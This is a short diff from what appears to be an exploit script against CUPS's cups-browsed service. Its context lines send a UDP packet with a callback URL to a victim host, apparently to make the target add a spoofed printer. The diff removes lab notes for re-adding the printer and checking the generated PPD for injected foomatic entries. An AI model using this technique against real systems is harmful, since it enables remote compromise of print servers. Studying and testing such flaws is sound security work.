@@ -178,22 +178,3 @@ if IMPERSONATE_PRINTER:
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
-
-# commands for forcing printer readded with IPPtoPPD redone
-#
-# monitor:
-#   sudo journalctl -u cups-browsed.service --follow
-#   lpstat -p  # -l
-#
-# (re)add printer:
-#   sudo systemctl restart cups cups-browsed
-#   sudo lpadmin -x 192_168_122_1
-#       # remove if restart alone isn't enough (i.e. after attempt printing)
-#   # restart/send UDP packet again
-#   echo "foo" | lp -d 192_168_122_1
-#       # test print
-#
-# verify ppd:
-#   sudo cat /etc/cups/ppd/192_168_122_1.ppd
-#   sudo cat /etc/cups/ppd/192_168_122_1.ppd | grep -Pi "(foo|priv)"
-#      foomatic or privacy or whatever else
